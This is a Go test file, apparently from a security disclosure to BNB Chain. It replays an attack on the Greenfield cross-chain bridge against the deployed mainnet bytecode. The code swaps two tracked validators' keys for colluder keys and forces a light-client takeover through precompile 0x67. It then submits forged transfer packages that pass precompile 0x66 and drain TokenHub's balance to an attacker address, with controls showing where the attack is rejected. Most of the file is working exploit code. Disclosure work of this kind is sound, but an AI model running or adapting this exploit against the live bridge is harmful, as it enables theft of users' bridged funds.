// Package parlia test: Stage 11 — GF-V1 Go oracle.
//
// The external auditor requires a Foundry/Hardhat mainnet-fork PoC. Foundry's
// fork EVM (upstream revm) does not implement BSC's chain-specific precompiles
// 0x66/0x67, so the Foundry test bridges them with auditable Solidity
// implementations. THIS test is the execution-level ORACLE for that bridge:
//
//   - it deploys the exact deployed mainnet bytecode of the live bridge at
//     the live addresses,
//   - initializes GnfdLightClient with the REAL live consensus state captured
//     in reanchor.json (byte-identical tracked validator set),
//   - applies the SAME collusion patch the Foundry test applies via vm.store
//     (two of the four tracked validators' ed25519 consensus pubkeys are
//     replaced by deterministic colluder keys = 50% of the voting power),
//   - executes the attack through the REAL precompile 0x67 (skip-path
//     takeover at gnfdHeight+2) and the REAL precompile 0x66 (forged
//     TransferInSynPackage drain of TokenHub),
//   - captures the exact 0x67 return bytes and the 0x66 verdicts for the exact
//     attack inputs so the Foundry bridge can be bound to them, and
//   - runs the mandated controls: adjacent-height pinning, single-colluder
//     power rejection, and the no-collusion rejection.
//
// Output: oracle_output.json next to payloads.json.
package parlia

import (
        "bytes"
        "crypto/sha256"
        "encoding/binary"
        "encoding/hex"
        "encoding/json"
        "fmt"
        "math/big"
        "os"
        "strings"
        "testing"

        "github.com/ethereum/go-ethereum/accounts/abi"
        "github.com/ethereum/go-ethereum/common"
        "github.com/ethereum/go-ethereum/core/tracing"
        "github.com/ethereum/go-ethereum/core/vm"
        "github.com/ethereum/go-ethereum/crypto"
        "github.com/ethereum/go-ethereum/params"
        "github.com/holiman/uint256"
)

// oracle addresses (must match cmd/gfpayload)
var (
        oCrossChain = common.HexToAddress("0x77e719b714be09F70D484AB81F70D02B0E182f7d")
        oLightCl    = common.HexToAddress("0x433bB48Bd86c089375e53b2E2873A9C4bC0e986B")
        oTokenHub   = common.HexToAddress("0xeA97dF87E6c7F68C9f95A69dA79E19B834823F25")
        oRelayerHub = common.HexToAddress("0x31C477F05CE58bB81A9FB4b8c00560f1cBe185d1")
        oPre067     = common.HexToAddress("0x0000000000000000000000000000000000000067")
        oPre066     = common.HexToAddress("0x0000000000000000000000000000000000000066")
)

// oLCExtraABI has the getters the p5s1 minimal ABI omitted.
const oLCExtraABI = `[
 {"name":"consensusStateBytes","type":"function","inputs":[],"outputs":[{"name":"","type":"bytes"}],"stateMutability":"view"}
]`

func oLCExtra(t *testing.T) *abi.ABI {
        t.Helper()
        a, err := abi.JSON(strings.NewReader(oLCExtraABI))
        if err != nil {
                t.Fatal(err)
        }
        return &a
}

type oPkg struct {
        Seq        uint64 `json:"seq"`
        AmountWei  string `json:"amountWei"`
        Payload    string `json:"payload"`
        BlsSig     string `json:"blsSig"`
        BitSet     string `json:"bitSet"`
        EventTime  uint64 `json:"eventTime"`
        RelayerFee string `json:"relayerFeeWei"`
}

type oPayloads struct {
        Meta struct {
                AnchorBlock         uint64 `json:"anchorBlock"`
                AnchorHash          string `json:"anchorHash"`
                ExecTimestamp       uint64 `json:"execTimestamp"`
                ChainID             string `json:"chainID"`
                GnfdHeightH0        uint64 `json:"gnfdHeightH0"`
                SkipHeight          uint64 `json:"skipHeight"`
                AdjacentHeight      uint64 `json:"adjacentHeight"`
                RecvSequenceCh1     uint64 `json:"recvSequenceCh1"`
                TokenHubBalanceWei  string `json:"tokenHubBalanceWei"`
                RealRelayer0        string `json:"realRelayer0"`
        } `json:"meta"`
        Colluders []struct {
                Index    int    `json:"index"`
                Name     string `json:"name"`
                PubKey   string `json:"pubKey"`
                Addr     string `json:"addr"`
                Replaces int    `json:"replacesValidator"`
        } `json:"colluders"`
        AttackerSet []struct {
                Name      string `json:"name"`
                PubKey    string `json:"pubKey"`
                Power     int64  `json:"power"`
                Relayer   string `json:"relayer"`
                BlsPubKey string `json:"blsPubKey"`
        } `json:"attackerSet"`
        Attacker struct {
                EOA     string `json:"eoa"`
                Relayer string `json:"relayer"`
        } `json:"attacker"`
        LightBlocks struct {
                Main struct {
                        Bytes      string `json:"bytes"`
                        Height     string `json:"height"`
                        SigSetHash string `json:"sigSetHash"`
                } `json:"main"`
                Adjacent struct {
                        Bytes      string `json:"bytes"`
                        Height     string `json:"height"`
                        SigSetHash string `json:"sigSetHash"`
                } `json:"adjacent"`
        } `json:"lightBlocks"`
        ConsensusState struct {
                Real                 string `json:"real"`
                Patched              string `json:"patched"`
                PatchedSingle        string `json:"patchedSingle"`
                ExpectedNewAfterSync string `json:"expectedNewAfterSync"`
                AttackerSetHash      string `json:"attackerSetHash"`
        } `json:"consensusState"`
        Precompile067InputMain string         `json:"precompile067InputMain"`
        Packages               []oPkg         `json:"packages"`
        BlsVerifyInputs        map[string]string `json:"blsVerifyInputs"`
        Calldata               struct {
                SyncLightBlock string `json:"syncLightBlock"`
                HandlePackage1 string `json:"handlePackage1"`
                HandlePackage2 string `json:"handlePackage2"`
        } `json:"calldata"`
        Expected struct {
                HeightAfterSync         uint64 `json:"heightAfterSync"`
                Package1PayoutWei       string `json:"package1PayoutWei"`
                Package2LockWei         string `json:"package2LockWei"`
                AttackerFinalBalanceWei string `json:"attackerFinalBalanceWei"`
                TokenHubResidualWei     string `json:"tokenHubResidualWei"`
                RelayerHubHoldingWei    string `json:"relayerHubHoldingWei"`
        } `json:"expected"`
}

func oUnhex(t *testing.T, s string) []byte {
        t.Helper()
        s = strings.TrimPrefix(strings.TrimSpace(s), "0x")
        if len(s)%2 == 1 {
                s = "0" + s
        }
        b, err := hex.DecodeString(s)
        if err != nil {
                t.Fatalf("bad hex: %v", err)
        }
        return b
}

// TestP5S2_GFV1_GoOracle executes the exact Stage-11 attack payloads against
// the deployed bridge bytecode and the REAL precompiles 0x66/0x67, using the
// reanchored mainnet consensus state, and emits oracle_output.json binding the
// Foundry bridge to the real precompile behavior.
func TestP5S2_GFV1_GoOracle(t *testing.T) {
        anchorPath := os.Getenv("GF_ANCHOR")
        if anchorPath == "" {
                anchorPath = "/home/z/my-project/download/bnb_submission_gfv1_final/reanchor.json"
        }
        payloadPath := os.Getenv("GF_PAYLOADS")
        if payloadPath == "" {
                payloadPath = "/home/z/my-project/download/bnb_submission_gfv1_final/bnb_submission_gfv1_foundry/test/payloads.json"
        }
        outPath := os.Getenv("GF_ORACLE_OUT")
        if outPath == "" {
                outPath = "/home/z/my-project/download/bnb_submission_gfv1_final/oracle_output.json"
        }

        rawP, err := os.ReadFile(payloadPath)
        if err != nil {
                t.Fatalf("read payloads: %v", err)
        }
        var p oPayloads
        if err := json.Unmarshal(rawP, &p); err != nil {
                t.Fatalf("parse payloads: %v", err)
        }

        execTs := p.Meta.ExecTimestamp
        h0 := p.Meta.GnfdHeightH0
        balance := new(big.Int)
        balance.SetString(p.Meta.TokenHubBalanceWei, 10)

        env := r1Env{
                name:      "s11",
                number:    p.Meta.AnchorBlock,
                timestamp: execTs,
                milliTs:   execTs * 1000,
                coinbase:  common.HexToAddress("0x0505050505050505050505050505050505050505"),
                random:    common.HexToHash("0x0505050505050505050505050505050505050505050505050505050505050505"),
                gasLimit:  200_000_000,
                baseFee:   big.NewInt(0),
        }
        sdb, _ := r1NewStateDB(t)
        cfg := r1ChainConfig()

        // ---- deploy the exact deployed runtime bytecode at the live addresses
        sdb.SetCode(oCrossChain, p5LoadHex(t, "crosschain_runtime.hex"), tracing.CodeChangeGenesis)
        sdb.SetCode(oLightCl, p5LoadHex(t, "gnfdlightclient_runtime.hex"), tracing.CodeChangeGenesis)
        sdb.SetCode(oTokenHub, p5LoadHex(t, "tokenhub_runtime.hex"), tracing.CodeChangeGenesis)
        sdb.SetCode(oRelayerHub, p5LoadHex(t, "relayerhub_runtime.hex"), tracing.CodeChangeGenesis)
        sdb.AddBalance(oTokenHub, uint256.MustFromBig(balance), tracing.BalanceIncreaseGenesisBalance)

        lc, cc, th, rh := p5ABIs(t)
        attacker := common.HexToAddress(p.Attacker.EOA)
        attackerRelayer := common.HexToAddress(p.Attacker.Relayer)
        realRelayer0 := common.HexToAddress(p.Meta.RealRelayer0)

        oracle := map[string]interface{}{
                "source":      "TestP5S2_GFV1_GoOracle (real precompiles 0x66/0x67, deployed bytecode, reanchored state)",
                "payloadsSha": fmt.Sprintf("%x", sha256.Sum256(rawP)),
        }

        // ---- initialize through the contracts' real entry points, with the REAL
        // live consensus state (from the anchor).
        csReal := oUnhex(t, p.ConsensusState.Real)
        if len(csReal) == 0 {
                t.Fatal("empty consensusState.real")
        }
        oCall(t, env, sdb, cfg, attacker, oLightCl, mustPack(t, lc, "initialize", csReal), 5_000_000, "lightclient initialize")
        oCall(t, env, sdb, cfg, attacker, oCrossChain, mustPack(t, cc, "initialize", p5GnfdChainID, true), 5_000_000, "crosschain initialize")
        oCall(t, env, sdb, cfg, attacker, oTokenHub, mustPack(t, th, "initialize"), 5_000_000, "tokenhub initialize")
        oCall(t, env, sdb, cfg, attacker, oRelayerHub, mustPack(t, rh, "initialize"), 5_000_000, "relayerhub initialize")

        // ---- verify the harness state matches the anchor byte-for-byte
        if v := oView(t, env, sdb, lc, attacker, oLightCl, "gnfdHeight"); v[0].(uint64) != h0 {
                t.Fatalf("harness gnfdHeight %d != anchor %d", v[0].(uint64), h0)
        }
        if got := oView(t, env, sdb, oLCExtra(t), attacker, oLightCl, "consensusStateBytes"); !bytes.Equal(got[0].([]byte), csReal) {
                t.Fatalf("harness consensusStateBytes != anchor bytes (%d vs %d)", len(got[0].([]byte)), len(csReal))
        }

        // ---- inject the live receive sequence for channel 1 (the fork has it
        // natively; the fresh harness starts at 0).
        recvWant := p.Meta.RecvSequenceCh1
        seqSlotFound := false
        for base := uint64(60); base <= 68 && !seqSlotFound; base++ {
                key := make([]byte, 64)
                binary.BigEndian.PutUint64(key[24:32], 1) // channel id 1
                binary.BigEndian.PutUint64(key[56:64], base)
                slot := common.BytesToHash(keccakOrPanic(key))
                prev := sdb.GetState(oCrossChain, slot)
                sdb.SetState(oCrossChain, slot, common.BigToHash(new(big.Int).SetUint64(recvWant)))
                if v := oView(t, env, sdb, cc, attacker, oCrossChain, "channelReceiveSequenceMap", uint8(1)); v[0].(uint64) == recvWant {
                        oracle["crossChainRecvSeqSlotBase"] = base
                        seqSlotFound = true
                } else {
                        sdb.SetState(oCrossChain, slot, prev) // restore — do not pollute other mappings
                }
        }
        if !seqSlotFound {
                t.Fatal("could not locate channelReceiveSequenceMap slot base in 60..68")
        }

        // ---- apply the collusion patch (mirrors the Foundry vm.store patch):
        // tracked validators #0/#1 ed25519 consensus pubkeys -> colluder pubkeys.
        csPatched := oUnhex(t, p.ConsensusState.Patched)
        if len(csPatched) != len(csReal) {
                t.Fatal("patched cs length mismatch")
        }
        // consensusStateBytes data lives at keccak256(abi.encode(54)) (32-byte
        // input!); word w at that value + w (numeric addition).
        var p54 [32]byte
        binary.BigEndian.PutUint64(p54[24:32], 54)
        csBase := new(big.Int).SetBytes(crypto.Keccak256(p54[:]))
        for w := 0; w*32 < len(csPatched); w++ {
                lo, hi := w*32, (w+1)*32
                if hi > len(csPatched) {
                        hi = len(csPatched)
                }
                slot := common.BigToHash(new(big.Int).Add(csBase, big.NewInt(int64(w))))
                var val [32]byte
                // bytes tails are LEFT-aligned in their last storage word (verified
                // on-chain: word15 = cs[480:504] + 8 zero bytes), mirroring solidity's
                // copy-then-truncate semantics.
                copy(val[:hi-lo], csPatched[lo:hi])
                sdb.SetState(oLightCl, slot, val)
        }
        // NOTE: the length slot 54 is deliberately NOT written — Solidity stores
        // bytes length as 2*len+1 (verified on-chain: slot 54 == 1009 == 2*504+1)
        // and the patch does not change the length anyway.
        // validatorSet array data base: keccak256(abi.encode(57)) (32-byte input);
        // element i's pubKey slot: base + 3*i
        var p57 [32]byte
        binary.BigEndian.PutUint64(p57[24:32], 57)
        vsBase := new(big.Int).SetBytes(crypto.Keccak256(p57[:]))
        for _, c := range p.Colluders {
                slot := common.BigToHash(new(big.Int).Add(vsBase, big.NewInt(int64(3*c.Replaces))))
                sdb.SetState(oLightCl, slot, common.BytesToHash(oUnhex(t, c.PubKey)))
        }

        // verify the patch through the contract getters
        {
                got := oView(t, env, sdb, oLCExtra(t), attacker, oLightCl, "consensusStateBytes")
                gb := got[0].([]byte)
                if !bytes.Equal(gb, csPatched) {
                        nd := 0
                        diffs := []int{}
                        for i := 0; i < len(gb) && i < len(csPatched); i++ {
                                if gb[i] != csPatched[i] {
                                        nd++
                                        diffs = append(diffs, i)
                                }
                        }
                        if len(diffs) > 0 {
                                t.Logf("first diff offsets: %v ... last: %d", diffs[:min(10, len(diffs))], diffs[len(diffs)-1])
                                s, e := diffs[0], diffs[len(diffs)-1]
                                t.Logf("getter  [%d:%d] = %x", s, e+1, gb[s:e+1])
                                t.Logf("patched [%d:%d] = %x", s, e+1, csPatched[s:e+1])
                        }
                        dbgSlot := common.BigToHash(new(big.Int).Add(csBase, big.NewInt(2)))
                        t.Logf("getter len=%d patched len=%d diffbytes=%d", len(gb), len(csPatched), nd)
                        t.Logf("direct sdb read slot(csBase+2)=%x", sdb.GetState(oLightCl, dbgSlot))
                        t.Logf("csPatched[64:96]                  =%x", csPatched[64:96])
                        t.Logf("getter[64:96]                    =%x", gb[64:96])
                        t.Logf("real    [64:96]                   =%x", csReal[64:96])
                        for _, w2 := range []int{3, 5, 6} {
                                sl := common.BigToHash(new(big.Int).Add(csBase, big.NewInt(int64(w2))))
                                t.Logf("sdb slot(csBase+%d)=%x", w2, sdb.GetState(oLightCl, sl))
                        }
                        t.Fatalf("collusion patch: consensusStateBytes getter mismatch")
                }
        }
        for _, c := range p.Colluders {
                v := oView(t, env, sdb, lc, attacker, oLightCl, "validatorSet", new(big.Int).SetUint64(uint64(c.Replaces)))
                pubCopy := v[0].([32]byte)
                if !bytes.Equal(pubCopy[:], oUnhex(t, c.PubKey)) {
                        t.Fatalf("collusion patch: validatorSet(%d).pubKey mismatch", c.Replaces)
                }
        }
        t.Logf("collusion patch installed: validators %d/%d -> colluder keys (50%% of voting power)",
                p.Colluders[0].Replaces, p.Colluders[1].Replaces)

        // ---- DIRECT PRECOMPILE PROBES (the oracle's core value) --------------
        lbMain := oUnhex(t, p.LightBlocks.Main.Bytes)
        lbAdjacent := oUnhex(t, p.LightBlocks.Adjacent.Bytes)
        csSingle := oUnhex(t, p.ConsensusState.PatchedSingle)

        probe := func(cs, lb []byte, label string) (ok bool, ret []byte) {
                in := oMake067Input(cs, lb)
                ret, _, err := r1Call(env, sdb, cfg, attacker, oPre067, in, 60_000_000, uint256.NewInt(0))
                t.Logf("0x67 probe %-28s ok=%v ret=%x err=%v", label, err == nil, ret, err)
                return err == nil, ret
        }

        // (d) no-collusion control: the REAL tracked set + the phantom commit.
        ok, _ := probe(csReal, lbMain, "noCollusion(realSet)")
        if ok {
                t.Fatal("CONTROL FAILED: real (unpatched) tracked set accepted the phantom commit")
        }

        // (b) adjacent-height control with the patched set.
        ok, _ = probe(csPatched, lbAdjacent, "adjacent(patchedSet)")
        if ok {
                t.Fatal("CONTROL FAILED: adjacent-height sync accepted (pinning broken?)")
        }

        // (c) single-colluder power control: same fully-signed phantom block, but
        // the tracked set holds only ONE colluder key (1000/4000 = 25% < 1/3).
        ok, _ = probe(csSingle, lbMain, "singleColluder(25% power)")
        if ok {
                t.Fatal("CONTROL FAILED: single colluder (25% power) accepted")
        }

        // (a) MAIN: patched set + skip-path phantom at H0+2 — must SUCCEED and
        // return exactly [1B changed|23B pad|8B len|newCS].
        ok, ret067 := probe(csPatched, lbMain, "MAIN(patchedSet,skip)")
        if !ok {
                t.Fatal("MAIN 0x67 probe failed")
        }
        expectedNewCS := oUnhex(t, p.ConsensusState.ExpectedNewAfterSync)
        want067 := make([]byte, 32, 32+len(expectedNewCS))
        want067[0] = 0x01
        binary.BigEndian.PutUint64(want067[24:32], uint64(len(expectedNewCS)))
        want067 = append(want067, expectedNewCS...)
        if !bytes.Equal(ret067, want067) {
                t.Fatalf("MAIN 0x67 output != generator expectation:\n got %x\nwant %x", ret067, want067)
        }
        oracle["precompile067ReturnMain"] = "0x" + hex.EncodeToString(ret067)
        t.Logf("MAIN 0x67 output matches the generator's expected new consensus state (%d bytes cs)", len(expectedNewCS))

        // cross-check: the probe input must equal payloads.precompile067InputMain
        if in := oUnhex(t, p.Precompile067InputMain); !bytes.Equal(in, oMake067Input(csPatched, lbMain)) {
                t.Fatal("precompile067InputMain mismatch vs (patched cs || main LB)")
        }

        // ---- syncLightBlock through the contract via a REAL tracked relayer --
        syncData := oUnhex(t, p.Calldata.SyncLightBlock)
        oCall(t, env, sdb, cfg, realRelayer0, oLightCl, syncData, 60_000_000, "syncLightBlock(main)")

        if v := oView(t, env, sdb, lc, attacker, oLightCl, "gnfdHeight"); v[0].(uint64) != p.Expected.HeightAfterSync {
                t.Fatalf("gnfdHeight after sync = %d, want %d", v[0].(uint64), p.Expected.HeightAfterSync)
        }
        for i, av := range p.AttackerSet {
                v := oView(t, env, sdb, lc, attacker, oLightCl, "validatorSet", new(big.Int).SetUint64(uint64(i)))
                pub := v[0].([32]byte)
                power := v[1].(int64)
                relayer := v[2].(common.Address)
                bls := v[3].([]byte)
                if !bytes.Equal(pub[:], oUnhex(t, av.PubKey)) || power != av.Power ||
                        relayer != common.HexToAddress(av.Relayer) || !bytes.Equal(bls, oUnhex(t, av.BlsPubKey)) {
                        t.Fatalf("tracked validator %d not replaced by attacker entry %s", i, av.Name)
                }
        }
        if v := oView(t, env, sdb, lc, attacker, oLightCl, "isRelayer", attackerRelayer); !v[0].(bool) {
                t.Fatal("attacker relayer not registered after takeover")
        }
        if v := oView(t, env, sdb, lc, attacker, oLightCl, "isRelayer", realRelayer0); v[0].(bool) {
                t.Fatal("old real relayer still registered after takeover")
        }
        if v := oView(t, env, sdb, lc, attacker, oLightCl, "nextValidatorSetHash"); !bytes.Equal(new32(v[0].([32]byte)), oUnhex(t, p.ConsensusState.AttackerSetHash)) {
                t.Fatal("nextValidatorSetHash != attacker set hash")
        }
        oracle["takeoverVerified"] = true

        // ---- direct 0x66 probes on the two packages' (msgHash, sig, keys) ------
        // Success returns common.Big1.Bytes() == 0x01 (single byte); failure
        // returns empty bytes (verified against core/vm/contracts.go).
        for i, in := range []string{p.BlsVerifyInputs["package1"], p.BlsVerifyInputs["package2"]} {
                ret, _, err := r1Call(env, sdb, cfg, attacker, oPre066, oUnhex(t, in), 60_000_000, uint256.NewInt(0))
                if err != nil {
                        t.Fatalf("0x66 probe package %d: %v", i+1, err)
                }
                if len(ret) != 1 || ret[0] != 0x01 {
                        t.Fatalf("0x66 probe package %d: verdict %x != 01", i+1, ret)
                }
                t.Logf("0x66 probe package %d: verified (ret=01)", i+1)
        }
        oracle["precompile066Verified"] = []string{p.BlsVerifyInputs["package1"], p.BlsVerifyInputs["package2"]}

        // ---- the drain through the real contract flow ------------------------
        balAttacker0 := sdb.GetBalance(attacker).ToBig()
        if balAttacker0.Sign() != 0 {
                t.Fatalf("attacker initial balance %s != 0", balAttacker0)
        }
        oCall(t, env, sdb, cfg, attackerRelayer, oCrossChain, oUnhex(t, p.Calldata.HandlePackage1), 60_000_000, "handlePackage(pkg1)")
        want1 := new(big.Int)
        want1.SetString(p.Expected.Package1PayoutWei, 10)
        if b := sdb.GetBalance(attacker).ToBig(); b.Cmp(want1) != 0 {
                t.Fatalf("after pkg1 attacker balance = %s, want %s", b, want1)
        }
        oCall(t, env, sdb, cfg, attackerRelayer, oCrossChain, oUnhex(t, p.Calldata.HandlePackage2), 60_000_000, "handlePackage(pkg2)")
        if v := oView(t, env, sdb, cc, attacker, oCrossChain, "channelReceiveSequenceMap", uint8(1)); v[0].(uint64) != p.Meta.RecvSequenceCh1+2 {
                t.Fatalf("recv seq after both packages = %d, want %d", v[0].(uint64), p.Meta.RecvSequenceCh1+2)
        }
        lockAmt, lockUntil := p5LockInfo(t, env, sdb, th, attacker)
        want2 := new(big.Int)
        want2.SetString(p.Expected.Package2LockWei, 10)
        if lockAmt.Cmp(want2) != 0 {
                t.Fatalf("lock amount = %s, want %s", lockAmt, want2)
        }

        // ---- warp past the 12h lock and withdraw ------------------------------
        envLater := env
        envLater.timestamp = execTs + 43201
        envLater.milliTs = (execTs + 43201) * 1000
        oCall(t, envLater, sdb, cfg, attacker, oTokenHub, mustPack(t, th, "withdrawUnlockedToken", attacker), 5_000_000, "withdrawUnlockedToken")
        wantFinal := new(big.Int)
        wantFinal.SetString(p.Expected.AttackerFinalBalanceWei, 10)
        if b := sdb.GetBalance(attacker).ToBig(); b.Cmp(wantFinal) != 0 {
                t.Fatalf("final attacker balance = %s, want %s", b, wantFinal)
        }
        wantResid := new(big.Int)
        wantResid.SetString(p.Expected.TokenHubResidualWei, 10)
        if b := sdb.GetBalance(oTokenHub).ToBig(); b.Cmp(wantResid) != 0 {
                t.Fatalf("TokenHub residual = %s, want %s", b, wantResid)
        }
        wantHub := new(big.Int)
        wantHub.SetString(p.Expected.RelayerHubHoldingWei, 10)
        if b := sdb.GetBalance(oRelayerHub).ToBig(); b.Cmp(wantHub) != 0 {
                t.Fatalf("RelayerHub holding = %s, want %s", b, wantHub)
        }

        oracle["drainVerified"] = map[string]string{
                "attackerFinalBalanceWei": wantFinal.String(),
                "tokenHubResidualWei":     wantResid.String(),
                "relayerHubHoldingWei":    wantHub.String(),
                "lockUntil":              lockUntil.String(),
        }
        oracle["controls"] = map[string]string{
                "noCollusion":   "REJECTED by real 0x67 (commit carries 0 power of the real tracked set)",
                "adjacent":      "REJECTED by real 0x67 (nextValidatorSetHash pinning)",
                "singleColluder": "REJECTED by real 0x67 (1000/4000 = 25% < 1/3 trust level)",
                "main":          "ACCEPTED by real 0x67 (2000/4000 = 50% > 1/3 trust level)",
        }

        blob, _ := json.MarshalIndent(oracle, "", "  ")
        if err := os.WriteFile(outPath, blob, 0644); err != nil {
                t.Fatalf("write oracle output: %v", err)
        }
        t.Logf("wrote %s", outPath)
        t.Logf("ORACLE COMPLETE: takeover at H0+2 with 50%% power, drain %s wei, TokenHub residual %s wei",
                wantFinal, wantResid)
}

// ---------------------------------------------------------------------------
// helpers
// ---------------------------------------------------------------------------

func mustPack(t *testing.T, a *abi.ABI, method string, args ...interface{}) []byte {
        t.Helper()
        data, err := a.Pack(method, args...)
        if err != nil {
                t.Fatalf("pack %s: %v", method, err)
        }
        return data
}

func oCall(t *testing.T, env r1Env, sdb vm.StateDB, cfg *params.ChainConfig, caller, to common.Address, data []byte, gas uint64, label string) {
        t.Helper()
        ret, _, err := r1Call(env, sdb, cfg, caller, to, data, gas, uint256.NewInt(0))
        if err != nil {
                t.Fatalf("%s: %v (ret=%s)", label, err, p5Reason(ret))
        }
}

func oView(t *testing.T, env r1Env, sdb vm.StateDB, a *abi.ABI, caller, to common.Address, method string, args ...interface{}) []interface{} {
        t.Helper()
        data, err := a.Pack(method, args...)
        if err != nil {
                t.Fatalf("pack %s: %v", method, err)
        }
        ret, _, err := r1Call(env, sdb, r1ChainConfig(), caller, to, data, 10_000_000, uint256.NewInt(0))
        if err != nil {
                t.Fatalf("view %s: %v (ret=%s)", method, err, p5Reason(ret))
        }
        v, err := a.Methods[method].Outputs.Unpack(ret)
        if err != nil {
                t.Fatalf("unpack %s: %v", method, err)
        }
        return v
}

func oMake067Input(cs, lb []byte) []byte {
        l := make([]byte, 32)
        binary.BigEndian.PutUint64(l[24:32], uint64(len(cs)))
        return append(append(l, cs...), lb...)
}

func keccakOrPanic(b []byte) []byte {
        return crypto.Keccak256(b)
}

func addHash(base []byte, off []byte) common.Hash {
        var buf [64]byte
        copy(buf[:32], base)
        copy(buf[32:], off)
        return common.BytesToHash(keccakOrPanic(buf[:]))
}

var _ = addHash // retained for potential debugging; not on the critical path


func p5LockInfo(t *testing.T, env r1Env, sdb vm.StateDB, a *abi.ABI, who common.Address) (*big.Int, *big.Int) {
        t.Helper()
        v := oView(t, env, sdb, a, who, oTokenHub, "lockInfoMap", who)
        return v[0].(*big.Int), v[1].(*big.Int)
}

func new32(v [32]byte) []byte { return append([]byte(nil), v[:]...) }
